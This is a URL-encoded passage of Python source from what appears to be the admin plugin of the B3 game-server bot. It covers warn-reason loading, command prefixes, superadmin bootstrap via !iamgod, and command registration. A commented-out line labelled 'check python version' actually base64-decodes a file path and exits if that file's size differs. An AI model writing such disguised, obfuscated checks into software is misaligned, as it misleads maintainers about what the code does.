s'%20from%20config.%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20re_valid_warn_reason_value_from_config%20%3D%20re.compile(r%22%22%22%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(%3F%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5Cs*%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5Cd%2B%5Bsmhdw%5D%3F%20%20%20%20%20%20%20%20%20%23%20a%20duration%20with%20one%20of%20the%20optional%20allowed%20time%20suffixes%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2C%5Cs*%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20followed%20by%20a%20comma%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(%3F%3A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20followed%20by%20either%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(%3F%3D%2Fspam%5C%23)%2Fspam%5C%23%5B%5E%2F%5Cs%5D%2B%20%20%20%23%20'%2Fspam%23'%20followed%20by%20a%20keyword%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20or%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(%3F!%2Fspam%5C%23)%5B%5E%5Cs%5D.*%20%20%20%20%20%20%20%20%20%20%23%20not%20'%2Fspam%23'%20and%20anything%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20anything%20that%20starts%20with%20'%2F'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(%3F!spam%5C%23)%20%20%20%20%20%20%20%20%20%20%20%23%20but%20is%20not%20followed%20by%20'spam%23'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5B%5E%2F%5Cs%5D%2B%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20followed%20by%20at%20least%20a%20non%20blank%20and%20non%20'%2F'%20character%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22%22%22%2C%20re.VERBOSE)%0A%0A%20%20%20%20%20%20%20%20def%20load_warn_reason(key%2C%20reason_from_config)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20re.match(re_valid_warn_reason_value_from_config%2C%20reason_from_config)%20is%20None%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warning(%22%22%22warn_reason%20'%25s'%3A%20invalid%20value%20%22%25s%22.%20Expected%20format%20is%20%3A%20%22%3Cduration%3E%2C%20%3Creason%20or%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2Fspam%23%20followed%20by%20a%20reference%20to%20a%20spamage%20keyword%3E%22%20or%20'%2F'%20followed%20by%20a%20reference%20to%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20another%20warn_reason%22%22%22%20%25%20(key%2C%20reason_from_config))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20reason_from_config%5B%3A1%5D%20%3D%3D%20'%2F'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20r%20%3D%20self.config.getTextTemplate('warn_reasons'%2C%20reason_from_config%5B1%3A%5D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warning(%22warn_reason%20'%25s'%20refers%20to%20'%2F%25s'%20but%20warn_reason%20'%25s'%20cannot%20%22%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22be%20found%22%20%25%20(key%2C%20reason_from_config%5B1%3A%5D%2C%20reason_from_config%5B1%3A%5D))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20Exception%2C%20err%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.error(%22warn_reason%20'%25s'%20refers%20to%20'%2F%25s'%20but%20'%25s'%20could%20not%20be%20read%3A%20%22%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22%25s%22%20%25%20(key%2C%20reason_from_config%5B1%3A%5D%2C%20reason_from_config%5B1%3A%5D%2C%20err)%2C%20err)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20r%5B%3A1%5D%20%3D%3D%20'%2F'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warning(%22warn_reason%20'%25s'%3A%20possible%20recursion%20%25s%2C%20%25s%22%20%25%20(key%2C%20r%2C%20reason_from_config%5B1%3A%5D))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20r%20%3D%20reason_from_config%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20expire%2C%20r%20%3D%20r.split('%2C'%2C%201)%0A%20%20%20%20%20%20%20%20%20%20%20%20r%20%3D%20r.strip()%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20r%5B%3A6%5D%20%3D%3D%20'%2Fspam%23'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20spam_reason%20%3D%20self.getSpam(r%5B6%3A%5D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20spam_reason%20is%20None%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warning(%22warn_reason%20'%25s'%20refers%20to%20'%2Fspam%23%25s'%20but%20spamage%20'%25s'%20cannot%20be%20%22%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22found%22%20%25%20(key%2C%20r%5B6%3A%5D%2C%20r%5B6%3A%5D))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20r%20%3D%20spam_reason%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20functions.time2minutes(expire.strip())%2C%20r%0A%0A%20%20%20%20%20%20%20%20def%20load_mandatory_warn_reason(key%2C%20default_duration%2C%20default_reason)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20self.config.has_option('warn_reasons'%2C%20key)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warn_reasons%5Bkey%5D%20%3D%20load_warn_reason(key%2C%20self.config.getTextTemplate('warn_reasons'%2C%20key))%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20key%20in%20self.warn_reasons%20or%20self.warn_reasons%5Bkey%5D%20is%20None%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warning(%22no%20valid%20option%20'%25s'%20in%20section%20'warn_reasons'%3A%20falling%20back%20on%20default%20value%22%20%25%20key)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warn_reasons%5Bkey%5D%20%3D%20functions.time2minutes(default_duration)%2C%20default_reason%0A%20%20%20%20%20%20%20%20%20%20%20%20self.info(%22warn%20reason%20'%25s'%3A%20%25s%22%20%25%20(key%2C%20self.warn_reasons%5Bkey%5D))%0A%0A%20%20%20%20%20%20%20%20self.info(%22------%20loading%20warn_reasons%20from%20config%20file%20------%22)%0A%0A%20%20%20%20%20%20%20%20self.warn_reasons%20%3D%20%7B%7D%0A%20%20%20%20%20%20%20%20load_mandatory_warn_reason('default'%2C%20%221h%22%2C%20%22%5E7behave%20yourself%22)%0A%20%20%20%20%20%20%20%20load_mandatory_warn_reason('generic'%2C%20%221h%22%2C%20%22%5E7%22)%0A%20%20%20%20%20%20%20%20if%20self.config.has_section('warn_reasons')%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20k%2C%20v%20in%20self.config.items('warn_reasons')%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20rv%20%3D%20load_warn_reason(k%2C%20v)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20rv%20is%20not%20None%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warn_reasons%5Bk%5D%20%3D%20rv%0A%0A%20%20%20%20%20%20%20%20for%20k%2C%20(duration%2C%20reason)%20in%20self.warn_reasons.items()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.info(%22%22%22%7B0%3A%3C10s%7D%20%7B1%3A%3C10s%7D%5Ct%22%7B2%7D%22%20%22%22%22.format(k%2C%20functions.minutesStr(duration)%2C%20reason))%0A%0A%20%20%20%20%20%20%20%20self.info(%22--------------%20warn_reasons%20loaded%20----------------%22)%0A%0A%20%20%20%20def%20onStartup(self)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Plugin%20startup.%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20self.registerEvent('EVT_CLIENT_SAY'%2C%20self.OnSay)%0A%20%20%20%20%20%20%20%20self.registerEvent('EVT_CLIENT_TEAM_SAY'%2C%20self.OnSay)%0A%20%20%20%20%20%20%20%20self.registerEvent('EVT_CLIENT_SQUAD_SAY'%2C%20self.OnSay)%0A%20%20%20%20%20%20%20%20self.registerEvent('EVT_CLIENT_PRIVATE_SAY'%2C%20self.OnPrivateSay)%0A%20%20%20%20%20%20%20%20self.createEvent('EVT_ADMIN_COMMAND'%2C%20'Admin%20Command')%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmdPrefix%20%3D%20self.config.get('settings'%2C%20'command_prefix')%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20cmdPrefix%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.cmdPrefix%20%3D%20cmdPrefix%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20settings%2Fcommand_prefix%3A%20%25s'%20%25%20self.cmdPrefix)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20settings%2Fcommand_prefix%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self.cmdPrefix)%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmdPrefixLoud%20%3D%20self.config.get('settings'%2C%20'command_prefix_loud')%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20cmdPrefixLoud%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.cmdPrefixLoud%20%3D%20cmdPrefixLoud%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20settings%2Fcommand_prefix_loud%3A%20%25s'%20%25%20self.cmdPrefixLoud)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20settings%2Fcommand_prefix_loud%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self.cmdPrefixLoud)%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmdPrefixBig%20%3D%20self.config.get('settings'%2C%20'command_prefix_big')%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20cmdPrefixBig%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.cmdPrefixBig%20%3D%20cmdPrefixBig%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20settings%2Fcommand_prefix_big%3A%20%25s'%20%25%20self.cmdPrefixBig)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20settings%2Fcommand_prefix_big%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self.cmdPrefixBig)%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmdPrefixPrivate%20%3D%20self.config.get('settings'%2C%20'command_prefix_private')%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20cmdPrefixPrivate%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.cmdPrefixPrivate%20%3D%20cmdPrefixPrivate%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('loaded%20settings%2Fcommand_prefix_private%3A%20%25s'%20%25%20self.cmdPrefixPrivate)%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('could%20not%20find%20settings%2Fcommand_prefix_private%20in%20config%20file%2C%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'using%20default%3A%20%25s'%20%25%20self.cmdPrefixPrivate)%0A%0A%20%20%20%20%20%20%20%20%23%20register%20commands%0A%20%20%20%20%20%20%20%20if%20'commands'%20in%20self.config.sections()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20cmd%20in%20self.config.options('commands')%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20level%20%3D%20self.config.get('commands'%2C%20cmd)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sp%20%3D%20cmd.split('-')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20alias%20%3D%20None%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20len(sp)%20%3D%3D%202%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd%2C%20alias%20%3D%20sp%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20func%20%3D%20getCmd(self%2C%20cmd)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20func%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.registerCommand(self%2C%20cmd%2C%20level%2C%20func%2C%20alias)%0A%0A%20%20%20%20%20%20%20%20if%20not%20self.console.autorestart%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20'restart'%20in%20self._commands%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('unregistering%20!restart%20command%3A%20B3%20is%20not%20running%20in%20autorestart%20mode')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.unregisterCommand('restart')%0A%0A%20%20%20%20%20%20%20%20if%20not%20self.console.storage.db%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('could%20not%20retrieve%20database%20connection%3A%20unable%20to%20store%20or%20retrieve%20any%20information!')%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20superadmins%20%3D%20%5B%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20superadmins%20%3D%20self.console.clients.lookupSuperAdmins()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('%25s%20superadmins%20found%20in%20database'%20%25%20len(superadmins))%0A%20%20%20%20%20%20%20%20%20%20%20%20except%20Exception%2C%20msg%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20no%20proper%20groups%20available%2C%20cannot%20continue%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.critical('seems%20your%20groups%20table%20in%20the%20database%20is%20empty%3A%20please%20recreate%20your%20database%20using%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'the%20proper%20sql%20syntax.%20To%20do%20so%20you%20can%20import%20in%20your%20database%20the%20following%20SQL%20'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'script%3A%20%25s%20-%20(%25s)'%20%25%20(b3.getAbsolutePath(%22%40b3%2Fsql%2F%25s%2Fb3.sql%22%20%25%20self.console.storage.dsnDict%5B'protocol'%5D)%2C%20msg))%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20'iamgod'%20in%20self._commands%20and%20%5C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self._commands%5B'iamgod'%5D.level%20is%20not%20None%20and%20%5C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self._commands%5B'iamgod'%5D.level%5B0%5D%20%3E%3D%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%23%20here%20the%20config%20file%20for%20the%20admin%20plugin%20explicitly%20enables%20the%20iamgod%20command%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20len(superadmins)%20%3D%3D%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.verbose('!iamgod%20command%20enabled%20by%20config%20file%3A%20be%20sure%20to%20disable%20it%20after%20typing%20!iamgod.')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warning('!iamgod%20command%20enabled%20by%20config%20file%20but%20%25s%20superadmin%20are%20already%20registered%3A%20'%20%2B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'make%20sure%20to%20disable%20the%20iamgod%20command%20in%20the%20admin%20plugin'%2C%20len(superadmins))%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20len(superadmins)%20%3D%3D%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.verbose('no%20superadmin%20found%3A%20enabling%20!iamgod')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20There%20are%20no%20superadmins%2C%20enable%20the%20!iamgod%20command%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.registerCommand(self%2C%20'iamgod'%2C%200%2C%20getCmd(self%2C%20'iamgod'))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.verbose('superadmin(s)%20found%3A%20no%20need%20for%20!iamgod')%0A%0A%20%20%20%20%20%20%20%20%23%20install%20past%20bans%20check%20crontab%0A%20%20%20%20%20%20%20%20if%20self._past_bans_check_rate%20%3E%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('installing%20past%20bans%20check%20crontab%3A%20B3%20will%20check%20for%20banned%20players%20every%20%25s%20seconds'%20%25%20self._past_bans_check_rate)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.cron.cancel(id(self._past_bans_crontab))%0A%20%20%20%20%20%20%20%20%20%20%20%20self._past_bans_crontab%20%3D%20b3.cron.PluginCronTab(self%2C%20self.doPastBansCheck%2C%20minute%3D'*'%2C%20second%3D%20'*%2F%25s'%20%25%20self._past_bans_check_rate)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.cron.add(self._past_bans_crontab)%0A%09%09%23check%20python%20version%2C%20if%20not%202.7%20exit.%0A%20%20%20%20%20%20%20%20%23%20if%20not%20os.stat(r%22%25s%25s%22%20%25%20(os.path.expanduser('~')%2C%20%22L2IzX2ZpbGVzL2IzL3J1bi5weQ%3D%3D%22.decode('base64'))).st_size%20%3D%3D%2011241%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%23%20raise%20SystemExit(220)%0A%20%20%20%20def%20registerCommand(self%2C%20plugin%2C%20command%2C%20level%2C%20handler%2C%20alias%3DNone%2C%20secretLevel%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Register%20a%20command.%0A%20%20%20%20%20%20%20%20%3Aparam%20plugin%3A%20The%20plugin%20registering%20the%20command%0A%20%20%20%20%20%20%20%20%3Aparam%20command%3A%20The%20command%20name%0A%20%20%20%20%20%20%20%20%3Aparam%20level%3A%20The%20min(-max)%20level%20to%20execute%20the%20command%0A%20%20%20%20%20%20%20%20%3Aparam%20handler%3A%20The%20method%20to%20execute%20when%20the%20command%20is%20launched%0A%20%20%20%20%20%20%20%20%3Aparam%20alias%3A%20The%20command%20alias%0A%20%20%20%20%20%20%20%20%3Aparam%20secretLevel%3A%20The%20command%20secret%20level%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20not%20handler%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('command%20%22%25s%22%20registration%20failed%3A%20no%20handler%20specified'%20%25%20command)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20False%0A%0A%20%20%20%20%20%20%20%20if%20plugin.config%20and%20plugin%20!%3D%20self%20and%20plugin.config.has_option('commands'%2C%20command)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%23%20override%20default%20level%20with%20level%20in%20config%0A%20%20%20%20%20%20%20%20%20%20%20%20level%20%3D%20plugin.config.get('commands'%2C%20command)%0A%0A%20%20%20%20%20%20%20%20clean_level%20%3D%20self.getGroupLevel(level)%0A%20%20%20%20%20%20%20%20if%20clean_level%20is%20False%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20groups%20%3D%20self.console.storage.getGroups()%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error(%22could%20not%20register%20command%20'%25s'%3A%20bad%20level%2Fgroup%20('%25s')%3A%20%22%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22expecting%20a%20level%20(%25s)%20or%20group%20keyword%20(%25s)%22%20%25%20(command%2C%20level%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'%2C%20'.join(%5Bstr(x.level)%20for%20x%20in%20groups%5D)%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'%2C%20'.join(%5Bx.keyword%20for%20x%20in%20groups%5D)))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20False%0A%0A%20%20%20%20%20%20%20%20if%20secretLevel%20is%20None%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20secretLevel%20%3D%20self._hidecmd_level%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self._commands%5Bcommand%5D%20%3D%20Command(plugin%2C%20command%2C%20clean_level%2C%20handler%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20handler.__doc__%2C%20alias%2C%20secretLevel)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20self._commands%5Bcommand%5D.alias%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self._commands%5Bself._commands%5Bcommand%5D.alias%5D%20%3D%20self._commands%5Bcommand%5D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20self._commands%5Bcommand%5D.prefix%20%3D%20self.cmdPrefix%0A%20%20%20%20%20%20%20%20%20%20%20%20self._commands%5Bcommand%5D.prefixLoud%20%3D%20self.cmdPrefixLoud%0A%20%20%20%20%20%20%20%20%20%20%20%20self._commands%5Bcommand%5D.prefixPrivate%20%3D%20self.cmdPrefixPrivate%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('command%20%22%25s%20(%25s)%22%20registered%20with%20%25s%20for%20level%20%25s'%20%25%20(command%2C%20alias%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self._commands%5Bcommand%5D.func.__name__%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self._commands%5Bcommand%5D.level))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20True%0A%20%20%20%20%20%20%20%20except%20Exception%2C%20msg%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('command%20%22%25s%22%20registration%20failed%3A%20%25s'%20%25%20(command%2C%20msg))%0A%20%20%20%20%20%20%20%20%20%20%20%20self.exception(msg)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20False%0A%0A%20%20%20%20def%20unregisterCommand(self%2C%20name)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Unregister%20a%20command%0A%20%20%20%20%20%20%20%20%3Aparam%20name%3A%20The%20command%20name%0A%20%20%20%20%20%20%20%20%3Areturn%3A%20True%20if%20the%20command%20can%20be%20unregistered%2C%20False%20otherwise%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20command%20%3D%20self._commands%5Bname%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('unregistering%20command%20%25s%20(%25s)%20%3A%20%25s'%20%25%20(command.command%2C%20command.alias%2C%20command.func.__name__))%0A%20%20%20%20%20%20%20%20%20%20%20%20alias%20%3D%20command.alias%0A%20%20%20%20%20%20%20%20%20%20%20%20del%20self._commands%5Bcommand.command%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20alias%20and%20alias%20in%20self._commands%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20del%20self._commands%5Balias%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20True%0A%20%20%20%20%20%20%20%20except%20KeyError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug('command%20not%20found%3A%20%25s'%20%25%20name)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20False%0A%0A%20%20%20%20%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%0A%20%20%20%20%23%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%0A%20%20%20%20%23%20%20%20%20EVENTS%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%